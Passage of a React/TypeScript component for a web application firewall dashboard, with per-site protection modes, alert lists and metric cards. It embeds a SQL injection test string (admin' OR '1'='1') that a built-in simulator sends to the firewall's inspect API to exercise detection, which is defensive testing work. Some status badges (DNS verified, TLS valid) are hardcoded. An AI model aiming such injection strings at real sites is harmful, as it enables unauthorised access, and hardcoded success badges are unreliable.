import React, { useState, useEffect } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  Radio,
  Flame,
  Activity,
  Layers,
  Globe,
  CheckCircle2,
  Zap,
  ArrowUpRight,
  Send,
  RefreshCw,
  Plus,
  Search,
  ExternalLink,
  Copy,
  Check,
  Settings,
  Shield,
  Eye,
} from 'lucide-react';
import {
  ResponsiveContainer,
  AreaChart,
  Area,
  XAxis,
  YAxis,
  Tooltip,
  BarChart,
  Bar,
  CartesianGrid,
} from 'recharts';
import { StatsSummary, Domain, WAFSecurityEvent } from '@/types/waf';
import { inspectWafRequest, getWafEvents } from '@/services/wafApi';
import { DEFAULT_WAF_STATS, DEFAULT_WAF_DOMAINS } from './wafDefaults';
import { WAFDetailModal } from './WAFDetailModal';

interface WAFOverviewTabProps {
  stats: StatsSummary | null;
  domains?: Domain[];
  selectedDomainId?: string;
  selectedDomain?: Domain;
  onSelectDomain?: (id: string) => void;
  onNavigateTab: (tab: string) => void;
  onOpenProtectModal?: () => void;
  onManageDomain?: (domain: Domain) => void;
  onDomainModeChange?: (domainId: string, newMode: 'monitor' | 'block' | 'hybrid') => void;
  onGlobalModeChange?: (newMode: 'monitor' | 'block' | 'hybrid') => void;
  isLiveConnected?: boolean;
  hideProtectButton?: boolean;
}

export const WAFOverviewTab: React.FC<WAFOverviewTabProps> = ({
  stats,
  domains = DEFAULT_WAF_DOMAINS,
  selectedDomainId = 'all',
  selectedDomain,
  onSelectDomain,
  onNavigateTab,
  onOpenProtectModal,
  onManageDomain,
  onDomainModeChange,
  onGlobalModeChange,
  isLiveConnected = true,
  hideProtectButton = false,
}) => {
  // Quick Simulator State for live proof of work
  const [simPayload, setSimPayload] = useState<string>("admin' OR '1'='1' --");
  const [simResult, setSimResult] = useState<any | null>(null);
  const [simLoading, setSimLoading] = useState<boolean>(false);

  // Fleet Filter & Search State
  const [fleetSearch, setFleetSearch] = useState<string>('');
  const [copiedDomainId, setCopiedDomainId] = useState<string | null>(null);

  // Isolated Alerts Per Website State
  const [domainAlerts, setDomainAlerts] = useState<Record<string, WAFSecurityEvent[]>>({});
  const [loadingAlerts, setLoadingAlerts] = useState<boolean>(false);
  const [alertFilter, setAlertFilter] = useState<'all' | 'block' | 'monitor' | 'critical'>('all');
  const [selectedInspectEvent, setSelectedInspectEvent] = useState<WAFSecurityEvent | null>(null);

  // Fallback defaults
  const effectiveStats = stats || DEFAULT_WAF_STATS;
  // Clean default domains list: keep fanos-sec.vercel.app and user-added ones, exclude any leftover dummy test domains
  const cleanedDomains = (domains && domains.length > 0 ? domains : DEFAULT_WAF_DOMAINS).filter(
    (d) =>
      d.domain_name === 'fanos-sec.vercel.app' ||
      !['juiceshop.lab.test', 'test-portal.example.com', 'attacker-proxy.com', 'demo-app.local', '127.0.0.1', 'localhost'].includes(
        d.domain_name
      )
  );
  const effectiveDomains = cleanedDomains.length > 0 ? cleanedDomains : DEFAULT_WAF_DOMAINS;

  // Fetch isolated alerts per domain
  const fetchDomainAlerts = async () => {
    setLoadingAlerts(true);
    try {
      const newAlertsMap: Record<string, WAFSecurityEvent[]> = {};
      for (const dom of effectiveDomains) {
        try {
          const res = await getWafEvents({ domain_id: dom.id, limit: 10 });
          newAlertsMap[dom.id] = res.events || [];
        } catch {
          newAlertsMap[dom.id] = [];
        }
      }
      setDomainAlerts(newAlertsMap);
    } catch (err) {
      console.warn('Failed to fetch domain alerts', err);
    } finally {
      setLoadingAlerts(false);
    }
  };

  useEffect(() => {
    fetchDomainAlerts();
    const interval = setInterval(fetchDomainAlerts, 10000);
    return () => clearInterval(interval);
  }, [domains]);

  const handleCopyDomain = (dom: Domain, e: React.MouseEvent) => {
    e.stopPropagation();
    navigator.clipboard?.writeText(dom.domain_name);
    setCopiedDomainId(dom.id);
    setTimeout(() => setCopiedDomainId(null), 2000);
  };

  const handleQuickSimulate = async (payloadToTest?: string, targetDomainName?: string) => {
    const payload = payloadToTest || simPayload;
    if (!payload.trim()) return;

    setSimLoading(true);
    try {
      const res = await inspectWafRequest({
        method: 'GET',
        path: '/api/v1/search',
        query_params: { q: payload },
        headers: {
          Host: targetDomainName || selectedDomain?.domain_name || 'fanos-sec.vercel.app',
          'User-Agent': 'Mozilla/5.0 (SecurityOps-Simulator)',
        },
        client_ip: '198.51.100.42',
      });
      setSimResult(res);
      // Refresh isolated alerts to immediately reflect the simulated test event
      await fetchDomainAlerts();
    } catch (err: any) {
      console.error('Simulation error', err);
    } finally {
      setSimLoading(false);
    }
  };

  const {
    total_inspected = 0,
    total_allowed = 0,
    total_monitored = 0,
    total_blocked = 0,
    current_mode = 'block',
    top_attack_categories = [],
    recent_activity_timeline = [],
  } = effectiveStats as any;

  const activeMode = (
    selectedDomain?.enforcement_mode || current_mode || 'block'
  ).toLowerCase();
  const isBlockMode = activeMode === 'block';
  const isHybridMode = activeMode === 'hybrid' || activeMode === 'both';
  const isMonitorMode = !isBlockMode && !isHybridMode;

  // Filtered Domains list
  const filteredDomains = effectiveDomains.filter((d) => {
    const matchesSearch =
      d.domain_name.toLowerCase().includes(fleetSearch.toLowerCase()) ||
      d.origin_url.toLowerCase().includes(fleetSearch.toLowerCase());
    return matchesSearch;
  });

  return (
    <div className="space-y-6 animate-in fade-in pb-10">
      {/* ── 1. UNIFIED COMMAND POSTURE & MODE SHIFT HERO BANNER ────────────────── */}
      <div
        className={`relative p-6 rounded-2xl border backdrop-blur-xl overflow-hidden transition-all shadow-2xl ${
          isBlockMode
            ? 'bg-gradient-to-r from-rose-950/40 via-slate-900/95 to-slate-950 border-rose-500/30 shadow-rose-950/20'
            : isHybridMode
            ? 'bg-gradient-to-r from-cyan-950/40 via-slate-900/95 to-[#0b1325] border-cyan-500/40 shadow-cyan-950/20'
            : 'bg-gradient-to-r from-amber-950/40 via-slate-900/95 to-slate-950 border-amber-500/30 shadow-amber-950/20'
        }`}
      >
        <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-6 relative z-10">
          <div className="flex items-start sm:items-center gap-4">
            <div
              className={`p-3.5 rounded-2xl border shrink-0 ${
                isBlockMode
                  ? 'bg-rose-500/15 border-rose-500/30 text-rose-400 shadow-lg shadow-rose-500/10'
                  : isHybridMode
                  ? 'bg-cyan-500/15 border-cyan-500/30 text-cyan-400 shadow-lg shadow-cyan-500/10'
                  : 'bg-amber-500/15 border-amber-500/30 text-amber-400 shadow-lg shadow-amber-500/10'
              }`}
            >
              {isBlockMode ? (
                <ShieldAlert className="w-7 h-7" />
              ) : isHybridMode ? (
                <Zap className="w-7 h-7" />
              ) : (
                <ShieldCheck className="w-7 h-7" />
              )}
            </div>

            <div>
              <div className="flex items-center gap-2.5 flex-wrap">
                <h2 className="text-base sm:text-lg font-bold text-white tracking-wide">
                  {isBlockMode
                    ? 'WAF Inline Blocking Mode Enforced'
                    : isHybridMode
                    ? 'WAF Hybrid Defense Mode (BOTH: Block Critical + Audit Low)'
                    : 'WAF Audit / Monitor Mode'}
                </h2>
                <span
                  className={`px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold uppercase tracking-wider border ${
                    isBlockMode
                      ? 'bg-rose-500/20 text-rose-300 border-rose-500/40 animate-pulse'
                      : isHybridMode
                      ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/40 animate-pulse'
                      : 'bg-amber-500/20 text-amber-300 border-amber-500/40'
                  }`}
                >
                  {isBlockMode ? 'ACTIVE ZERO-TOLERANCE DROP' : isHybridMode ? 'HYBRID ACTIVE' : 'PASSIVE AUDIT'}
                </span>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700">
                  PORT 8002 GATEWAY
                </span>
              </div>
              <p className="text-xs text-slate-300 mt-1.5 max-w-2xl leading-relaxed">
                {isBlockMode
                  ? 'Deterministic reverse proxy drops all high-risk payloads at the edge and returns HTTP 403 Forbidden with security correlation event IDs.'
                  : isHybridMode
                  ? 'Dual Protection Active: Automatically drops critical exploits (SQLi, RCE, Path Traversal) while auditing low-severity anomalous behavior.'
                  : 'Passive surveillance: All HTTP/HTTPS ingress transactions are inspected and scored without dropping. Shift to Block or Hybrid Mode to protect the origin.'}
              </p>
            </div>
          </div>

          {/* Interactive Mode Shifter & Direct Action Controls */}
          <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 w-full lg:w-auto shrink-0">
            {/* Shift Mode Buttons */}
            <div className="p-1 rounded-xl bg-slate-950/90 border border-slate-700/80 shadow-inner flex items-center gap-1">
              <button
                onClick={() => {
                  if (selectedDomainId && selectedDomainId !== 'all') {
                    onDomainModeChange?.(selectedDomainId, 'block');
                  } else {
                    onGlobalModeChange?.('block');
                  }
                }}
                className={`flex-1 sm:flex-none px-3.5 py-2 rounded-lg text-xs font-mono font-bold transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                  isBlockMode
                    ? 'bg-rose-500 text-white shadow-lg shadow-rose-500/30 ring-1 ring-rose-400'
                    : 'text-slate-400 hover:text-rose-300 hover:bg-rose-500/10'
                }`}
                title="Shift to Block Mode"
              >
                <ShieldAlert size={13} />
                <span>BLOCK</span>
              </button>

              <button
                onClick={() => {
                  if (selectedDomainId && selectedDomainId !== 'all') {
                    onDomainModeChange?.(selectedDomainId, 'hybrid');
                  } else {
                    onGlobalModeChange?.('hybrid');
                  }
                }}
                className={`flex-1 sm:flex-none px-3.5 py-2 rounded-lg text-xs font-mono font-bold transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                  isHybridMode
                    ? 'bg-cyan-500 text-slate-950 shadow-lg shadow-cyan-500/30 ring-1 ring-cyan-200'
                    : 'text-slate-400 hover:text-cyan-300 hover:bg-cyan-500/10'
                }`}
                title="Shift to Hybrid Mode"
              >
                <Zap size={13} />
                <span>HYBRID</span>
              </button>

              <button
                onClick={() => {
                  if (selectedDomainId && selectedDomainId !== 'all') {
                    onDomainModeChange?.(selectedDomainId, 'monitor');
                  } else {
                    onGlobalModeChange?.('monitor');
                  }
                }}
                className={`flex-1 sm:flex-none px-3.5 py-2 rounded-lg text-xs font-mono font-bold transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                  isMonitorMode
                    ? 'bg-amber-500 text-slate-950 shadow-lg shadow-amber-500/30 ring-1 ring-amber-200'
                    : 'text-slate-400 hover:text-amber-300 hover:bg-amber-500/10'
                }`}
                title="Shift to Monitor Mode"
              >
                <ShieldCheck size={13} />
                <span>MONITOR</span>
              </button>
            </div>

            {!hideProtectButton && onOpenProtectModal && (
              <button
                onClick={() => onOpenProtectModal?.()}
                className="px-4 py-2.5 rounded-xl text-xs font-bold bg-cyan-500 hover:bg-cyan-400 text-slate-950 transition-all shadow-md shadow-cyan-500/20 flex items-center justify-center gap-1.5 cursor-pointer shrink-0"
              >
                <Plus className="w-4 h-4 text-slate-950" />
                <span>Protect Website</span>
              </button>
            )}
          </div>
        </div>
      </div>

      {/* ── 2. PROTECTED WEBSITES & SEPARATED ISOLATED ALERTS ───────────────── */}
      <div className="space-y-4">
        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 pb-2 border-b border-slate-800">
          <div>
            <div className="flex items-center gap-2.5">
              <Shield className="w-5 h-5 text-cyan-400" />
              <h3 className="text-base font-bold text-white tracking-wide">
                Protected Target Applications & Dedicated Alerts
              </h3>
              <span className="px-2.5 py-0.5 rounded-full text-[11px] font-mono font-bold bg-cyan-500/10 text-cyan-300 border border-cyan-500/30">
                {effectiveDomains.length} Active Website{effectiveDomains.length > 1 ? 's' : ''}
              </span>
              <span className="px-2 py-0.5 rounded-full text-[10px] font-mono font-semibold bg-emerald-500/15 text-emerald-300 border border-emerald-500/30 flex items-center gap-1">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                DNS VERIFIED
              </span>
              <span
                className={`px-2 py-0.5 rounded-full text-[10px] font-mono font-semibold border flex items-center gap-1 ${
                  isLiveConnected
                    ? 'bg-emerald-500/15 text-emerald-300 border-emerald-500/30'
                    : 'bg-amber-500/15 text-amber-300 border-amber-500/30'
                }`}
              >
                <span
                  className={`w-1.5 h-1.5 rounded-full ${
                    isLiveConnected ? 'bg-emerald-400 animate-pulse' : 'bg-amber-400'
                  }`}
                />
                {isLiveConnected ? 'LIVE SYNC (8000)' : 'SYNCING'}
              </span>
            </div>
            <p className="text-xs text-slate-400 mt-1">
              Individual origin proxy routing, instant mode shift control, and strictly separated security alerts for each protected website.
            </p>
          </div>

          <div className="flex items-center gap-2 w-full sm:w-auto">
            <div className="relative flex-1 sm:w-60">
              <Search className="w-3.5 h-3.5 text-slate-500 absolute left-3 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                value={fleetSearch}
                onChange={(e) => setFleetSearch(e.target.value)}
                placeholder="Search domain..."
                className="w-full pl-9 pr-3 py-1.5 rounded-lg bg-slate-900 border border-slate-700 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-cyan-400 font-mono transition-colors"
              />
            </div>
            <button
              onClick={() => onOpenProtectModal?.()}
              className="px-3.5 py-1.5 rounded-lg text-xs font-bold bg-cyan-500 hover:bg-cyan-400 text-slate-950 transition-all flex items-center gap-1.5 shadow-md shadow-cyan-500/20 cursor-pointer shrink-0"
            >
              <Plus size={13} className="text-slate-950" />
              <span>+ Add Target</span>
            </button>
          </div>
        </div>

        {/* Website Cards with Separated Alerts */}
        <div className="space-y-6">
          {filteredDomains.map((dom) => {
            const rawMode = (dom.enforcement_mode || 'block').toLowerCase();
            const isCardBlock = rawMode === 'block';
            const isCardHybrid = rawMode === 'hybrid' || rawMode === 'both';
            const isCardMonitor = !isCardBlock && !isCardHybrid;
            const alertsForThisDomain = domainAlerts[dom.id] || [];

            // Filter alerts according to filter tab
            const filteredAlerts = alertsForThisDomain.filter((evt) => {
              if (alertFilter === 'block') return evt.decision === 'BLOCK';
              if (alertFilter === 'monitor') return evt.decision === 'MONITOR';
              if (alertFilter === 'critical') return evt.risk_score >= 70;
              return true;
            });

            return (
              <div
                key={dom.id}
                className="relative rounded-2xl bg-gradient-to-b from-slate-900/90 to-slate-950/95 border border-slate-800 shadow-xl overflow-hidden transition-all hover:border-slate-700"
              >
                {/* Glowing Top Status Line */}
                <div
                  className={`h-1.5 w-full ${
                    isCardBlock
                      ? 'bg-gradient-to-r from-rose-500 via-red-500 to-rose-600'
                      : isCardHybrid
                      ? 'bg-gradient-to-r from-cyan-500 via-sky-500 to-indigo-500'
                      : 'bg-gradient-to-r from-amber-500 via-yellow-500 to-orange-500'
                  }`}
                />

                <div className="p-6">
                  {/* Website Header Bar */}
                  <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4 pb-5 border-b border-slate-800/80">
                    <div className="flex items-center gap-3.5 min-w-0">
                      <div className="p-3 rounded-xl bg-cyan-500/10 border border-cyan-500/20 text-cyan-400 shrink-0">
                        <Globe className="w-6 h-6" />
                      </div>
                      <div className="min-w-0">
                        <div className="flex items-center gap-2 flex-wrap">
                          <h4 className="font-mono font-bold text-white text-base truncate" title={dom.domain_name}>
                            {dom.domain_name}
                          </h4>
                          <a
                            href={`https://${dom.domain_name}`}
                            target="_blank"
                            rel="noreferrer"
                            className="text-slate-400 hover:text-cyan-400 transition-colors"
                            title="Open live website"
                          >
                            <ExternalLink size={14} />
                          </a>
                          <button
                            onClick={(e) => handleCopyDomain(dom, e)}
                            className="text-slate-400 hover:text-cyan-300 transition-colors"
                            title="Copy domain name"
                          >
                            {copiedDomainId === dom.id ? (
                              <Check size={14} className="text-emerald-400" />
                            ) : (
                              <Copy size={14} />
                            )}
                          </button>
                        </div>

                        <div className="flex items-center gap-2 mt-1 flex-wrap text-xs font-mono">
                          <span className="px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider bg-emerald-500/15 text-emerald-300 border border-emerald-500/30 flex items-center gap-1">
                            <CheckCircle2 size={11} />
                            DNS VERIFIED
                          </span>
                          <span className="px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider bg-slate-800 text-slate-300 border border-slate-700">
                            {dom.environment || 'PRODUCTION'}
                          </span>
                          <span className="text-slate-400 text-[11px]">
                            Gateway Ingress: <strong className="text-cyan-400 font-mono">127.0.0.1:8002</strong>
                          </span>
                        </div>
                      </div>
                    </div>

                    {/* Dedicated Mode Shifter for this domain */}
                    <div className="flex items-center gap-2 w-full lg:w-auto justify-between lg:justify-end">
                      <div className="flex items-center p-1 rounded-xl bg-slate-950/80 border border-slate-800 text-xs font-mono font-bold">
                        <span className="text-[10px] uppercase text-slate-500 px-2 select-none hidden sm:inline">
                          Shift Mode:
                        </span>
                        <button
                          onClick={() => onDomainModeChange?.(dom.id, 'block')}
                          className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer flex items-center gap-1 ${
                            isCardBlock
                              ? 'bg-rose-500 text-white shadow-md shadow-rose-500/30 ring-1 ring-rose-400'
                              : 'text-slate-400 hover:text-rose-300 hover:bg-rose-500/10'
                          }`}
                          title="Enforce Blocking on this website"
                        >
                          <ShieldAlert size={12} />
                          <span>BLOCK</span>
                        </button>
                        <button
                          onClick={() => onDomainModeChange?.(dom.id, 'hybrid')}
                          className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer flex items-center gap-1 ${
                            isCardHybrid
                              ? 'bg-cyan-500 text-slate-950 shadow-md shadow-cyan-500/30 ring-1 ring-cyan-200'
                              : 'text-slate-400 hover:text-cyan-300 hover:bg-cyan-500/10'
                          }`}
                          title="Enforce Hybrid Defense on this website"
                        >
                          <Zap size={12} />
                          <span>HYBRID</span>
                        </button>
                        <button
                          onClick={() => onDomainModeChange?.(dom.id, 'monitor')}
                          className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer flex items-center gap-1 ${
                            isCardMonitor
                              ? 'bg-amber-500 text-slate-950 shadow-md shadow-amber-500/30 ring-1 ring-amber-200'
                              : 'text-slate-400 hover:text-amber-300 hover:bg-amber-500/10'
                          }`}
                          title="Enforce Passive Monitoring on this website"
                        >
                          <ShieldCheck size={12} />
                          <span>MONITOR</span>
                        </button>
                      </div>

                      <button
                        onClick={() => onManageDomain?.(dom)}
                        className="p-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 transition-colors cursor-pointer"
                        title="Configure Domain Settings"
                      >
                        <Settings size={15} />
                      </button>
                    </div>
                  </div>

                  {/* Split Section: Left Infrastructure Details, Right Separated Alert Intelligence */}
                  <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 mt-6">
                    {/* Left: Origin Routing & Verification Specs */}
                    <div className="lg:col-span-5 space-y-4">
                      <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
                        <div className="text-[10px] uppercase font-bold text-slate-400 tracking-wider flex items-center justify-between">
                          <span>Routing & Origin Specifications</span>
                          <span className="text-emerald-400 flex items-center gap-1">
                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                            Proxy Active
                          </span>
                        </div>

                        <div className="space-y-2 pt-1 border-t border-slate-800/60">
                          <div className="flex items-center justify-between text-slate-400">
                            <span>Upstream Origin:</span>
                            <a
                              href={dom.origin_url}
                              target="_blank"
                              rel="noreferrer"
                              className="text-cyan-400 hover:text-cyan-300 flex items-center gap-1 truncate max-w-[220px]"
                              title={dom.origin_url}
                            >
                              <span className="truncate">{dom.origin_url}</span>
                              <ExternalLink size={10} className="shrink-0" />
                            </a>
                          </div>

                          <div className="flex items-center justify-between text-slate-400">
                            <span>Ingress Listener:</span>
                            <span className="text-slate-200 font-semibold">127.0.0.1:8002</span>
                          </div>

                          <div className="flex items-center justify-between text-slate-400">
                            <span>TLS / SSL Mode:</span>
                            <span className="text-emerald-400 font-semibold">Strict (Valid)</span>
                          </div>

                          <div className="flex items-center justify-between text-slate-400">
                            <span>Enforcement Posture:</span>
                            <span
                              className={`font-bold ${
                                isCardBlock
                                  ? 'text-rose-400'
                                  : isCardHybrid
                                  ? 'text-cyan-400'
                                  : 'text-amber-400'
                              }`}
                            >
                              {isCardBlock
                                ? 'BLOCK (403 DROP)'
                                : isCardHybrid
                                ? 'HYBRID (DUAL)'
                                : 'MONITOR (AUDIT)'}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Quick Action Buttons for this website */}
                      <div className="flex items-center gap-2">
                        <button
                          onClick={() => {
                            setSimPayload(`admin' OR '1'='1' /* target: ${dom.domain_name} */`);
                            handleQuickSimulate(`admin' OR '1'='1' /* target: ${dom.domain_name} */`, dom.domain_name);
                          }}
                          disabled={simLoading}
                          className="flex-1 py-2.5 px-3 rounded-xl text-xs font-bold bg-gradient-to-r from-rose-500/15 to-orange-500/15 hover:from-rose-500/25 hover:to-orange-500/25 text-rose-300 border border-rose-500/30 transition-all flex items-center justify-center gap-1.5 cursor-pointer shadow-sm"
                        >
                          <Flame size={13} className="text-rose-400" />
                          <span>Simulate Threat Test</span>
                        </button>

                        <button
                          onClick={() => {
                            onSelectDomain?.(dom.id);
                            onNavigateTab('Live Inspect');
                          }}
                          className="py-2.5 px-3 rounded-xl text-xs font-semibold bg-slate-800/80 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all flex items-center gap-1.5 cursor-pointer"
                        >
                          <Eye size={13} className="text-cyan-400" />
                          <span>Inspect Live</span>
                        </button>
                      </div>
                    </div>

                    {/* Right: SEPARATED SECURITY ALERTS FOR THIS WEBSITE */}
                    <div className="lg:col-span-7">
                      <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 flex flex-col justify-between h-full">
                        <div className="flex items-center justify-between pb-3 border-b border-slate-800/80 gap-2 flex-wrap">
                          <div className="flex items-center gap-2">
                            <ShieldAlert className="w-4 h-4 text-rose-400" />
                            <h5 className="text-xs font-bold text-white tracking-wide font-mono flex items-center gap-1.5">
                              <span>Security Alerts for {dom.domain_name}</span>
                              {loadingAlerts && <RefreshCw size={11} className="animate-spin text-cyan-400" />}
                            </h5>
                            <span className="px-2 py-0.2 rounded-full text-[10px] font-mono font-bold bg-slate-800 text-slate-300 border border-slate-700">
                              {alertsForThisDomain.length}
                            </span>
                          </div>

                          {/* Alert filters */}
                          <div className="flex items-center gap-1 text-[10px] font-mono">
                            <button
                              onClick={() => setAlertFilter('all')}
                              className={`px-2 py-0.5 rounded transition-colors cursor-pointer ${
                                alertFilter === 'all'
                                  ? 'bg-cyan-500/20 text-cyan-300 font-bold'
                                  : 'text-slate-400 hover:text-slate-200'
                              }`}
                            >
                              All
                            </button>
                            <button
                              onClick={() => setAlertFilter('block')}
                              className={`px-2 py-0.5 rounded transition-colors cursor-pointer ${
                                alertFilter === 'block'
                                  ? 'bg-rose-500/20 text-rose-300 font-bold'
                                  : 'text-slate-400 hover:text-slate-200'
                              }`}
                            >
                              Blocked
                            </button>
                            <button
                              onClick={() => setAlertFilter('monitor')}
                              className={`px-2 py-0.5 rounded transition-colors cursor-pointer ${
                                alertFilter === 'monitor'
                                  ? 'bg-amber-500/20 text-amber-300 font-bold'
                                  : 'text-slate-400 hover:text-slate-200'
                              }`}
                            >
                              Monitored
                            </button>
                            <button
                              onClick={() => setAlertFilter('critical')}
                              className={`px-2 py-0.5 rounded transition-colors cursor-pointer ${
                                alertFilter === 'critical'
                                  ? 'bg-red-500/20 text-red-300 font-bold'
                                  : 'text-slate-400 hover:text-slate-200'
                              }`}
                            >
                              Critical
                            </button>
                          </div>
                        </div>

                        {/* Alert items or clean empty state */}
                        <div className="py-3 flex-1">
                          {filteredAlerts.length === 0 ? (
                            <div className="py-8 flex flex-col items-center justify-center text-center">
                              <div className="w-10 h-10 rounded-full bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 mb-2.5">
                                <ShieldCheck className="w-5 h-5 text-emerald-400" />
                              </div>
                              <p className="text-xs font-bold text-white tracking-wide">
                                Zero Security Alerts for {dom.domain_name}
                              </p>
                              <p className="text-[11px] text-slate-400 mt-1 max-w-sm leading-relaxed">
                                All ingress transactions are verified clean. Any blocked attack or anomaly targeting this origin will be logged and correlated here.
                              </p>
                              <button
                                onClick={() => {
                                  setSimPayload(`admin' OR '1'='1' /* target: ${dom.domain_name} */`);
                                  handleQuickSimulate(`admin' OR '1'='1' /* target: ${dom.domain_name} */`, dom.domain_name);
                                }}
                                disabled={simLoading}
                                className="mt-3 px-3 py-1.5 rounded-lg text-xs font-bold bg-cyan-500/15 hover:bg-cyan-500/25 text-cyan-300 border border-cyan-500/40 transition-all flex items-center gap-1.5 cursor-pointer"
                              >
                                <Flame size={12} className="text-cyan-400" />
                                <span>Simulate Attack to Test Defense</span>
                              </button>
                            </div>
                          ) : (
                            <div className="divide-y divide-slate-800/60 max-h-56 overflow-y-auto pr-1">
                              {filteredAlerts.map((evt) => (
                                <div
                                  key={evt.id}
                                  onClick={() => setSelectedInspectEvent(evt)}
                                  className="py-2.5 px-2 rounded-lg flex items-center justify-between gap-3 text-xs hover:bg-slate-800/40 transition-colors cursor-pointer group"
                                >
                                  <div className="flex items-center gap-2.5 min-w-0">
                                    <span
                                      className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase shrink-0 border ${
                                        evt.decision === 'BLOCK'
                                          ? 'bg-rose-500/20 text-rose-300 border-rose-500/40'
                                          : 'bg-amber-500/20 text-amber-300 border-amber-500/40'
                                      }`}
                                    >
                                      {evt.decision}
                                    </span>
                                    <div className="min-w-0">
                                      <div className="font-mono text-slate-200 font-bold truncate group-hover:text-cyan-300 transition-colors">
                                        {evt.findings?.[0]?.category || evt.findings?.[0]?.rule_id || 'Security Violation'}
                                      </div>
                                      <div className="text-[10px] text-slate-500 font-mono truncate">
                                        {evt.client_ip} • {evt.method} {evt.path}
                                      </div>
                                    </div>
                                  </div>

                                  <div className="flex items-center gap-2.5 shrink-0">
                                    <span
                                      className={`font-mono text-xs font-bold ${
                                        evt.risk_score >= 70
                                          ? 'text-rose-400'
                                          : evt.risk_score >= 30
                                          ? 'text-amber-400'
                                          : 'text-emerald-400'
                                      }`}
                                    >
                                      Score {evt.risk_score}
                                    </span>
                                    <Eye size={13} className="text-slate-400 group-hover:text-cyan-300 transition-colors" />
                                  </div>
                                </div>
                              ))}
                            </div>
                          )}
                        </div>

                        {/* Bottom link to view full audit logs */}
                        <div className="pt-2 border-t border-slate-800/60 flex items-center justify-between text-[11px] font-mono text-slate-400">
                          <span>Origin Telemetry: Verified</span>
                          <button
                            onClick={() => {
                              onSelectDomain?.(dom.id);
                              onNavigateTab('Events');
                            }}
                            className="text-cyan-400 hover:text-cyan-300 font-semibold flex items-center gap-1 transition-colors cursor-pointer"
                          >
                            <span>Open Detailed Event Log</span>
                            <ArrowUpRight size={11} />
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* ── 3. REAL-TIME THREAT METRICS & KPI STATUS CARDS ─────────────────────── */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* Total Inspected */}
        <div className="p-5 rounded-2xl bg-gradient-to-b from-cyan-950/20 via-slate-900/40 to-slate-950/80 border border-cyan-500/30 backdrop-blur-md transition-all hover:border-cyan-400/60">
          <div className="flex items-start justify-between">
            <div>
              <p className="text-[11px] font-semibold tracking-wider uppercase text-slate-400">Total Inspected</p>
              <p className="mt-2 text-3xl font-extrabold font-mono tracking-tight text-cyan-300">
                {total_inspected.toLocaleString()}
              </p>
              <p className="mt-1 text-xs text-slate-400 flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-cyan-500" />
                Live HTTP/HTTPS Requests
              </p>
            </div>
            <div className="p-3 rounded-xl bg-cyan-500/15 text-cyan-400 border border-cyan-500/30">
              <Activity className="w-5 h-5" />
            </div>
          </div>
          <div className="mt-3 pt-3 border-t border-slate-800/80 flex items-center justify-between text-[11px] font-mono">
            <span className="text-slate-500">Gateway Status</span>
            <span className="text-cyan-300">Port 8002 Ingress</span>
          </div>
        </div>

        {/* Requests Allowed */}
        <div className="p-5 rounded-2xl bg-gradient-to-b from-emerald-950/20 via-slate-900/40 to-slate-950/80 border border-emerald-500/30 backdrop-blur-md transition-all hover:border-emerald-400/60">
          <div className="flex items-start justify-between">
            <div>
              <p className="text-[11px] font-semibold tracking-wider uppercase text-slate-400">Clean Traffic Allowed</p>
              <p className="mt-2 text-3xl font-extrabold font-mono tracking-tight text-emerald-300">
                {total_allowed.toLocaleString()}
              </p>
              <p className="mt-1 text-xs text-slate-400 flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500" />
                Passed to Upstream Origin
              </p>
            </div>
            <div className="p-3 rounded-xl bg-emerald-500/15 text-emerald-400 border border-emerald-500/30">
              <ShieldCheck className="w-5 h-5" />
            </div>
          </div>
          <div className="mt-3 pt-3 border-t border-slate-800/80 flex items-center justify-between text-[11px] font-mono">
            <span className="text-slate-500">Sanitization</span>
            <span className="text-emerald-300">Clean Pass</span>
          </div>
        </div>

        {/* Monitored Anomalies */}
        <div className="p-5 rounded-2xl bg-gradient-to-b from-amber-950/20 via-slate-900/40 to-slate-950/80 border border-amber-500/30 backdrop-blur-md transition-all hover:border-amber-400/60">
          <div className="flex items-start justify-between">
            <div>
              <p className="text-[11px] font-semibold tracking-wider uppercase text-slate-400">Monitored Anomalies</p>
              <p className="mt-2 text-3xl font-extrabold font-mono tracking-tight text-amber-300">
                {total_monitored.toLocaleString()}
              </p>
              <p className="mt-1 text-xs text-slate-400 flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-amber-500" />
                Audited Low-Risk Traffic
              </p>
            </div>
            <div className="p-3 rounded-xl bg-amber-500/15 text-amber-400 border border-amber-500/30">
              <Radio className="w-5 h-5" />
            </div>
          </div>
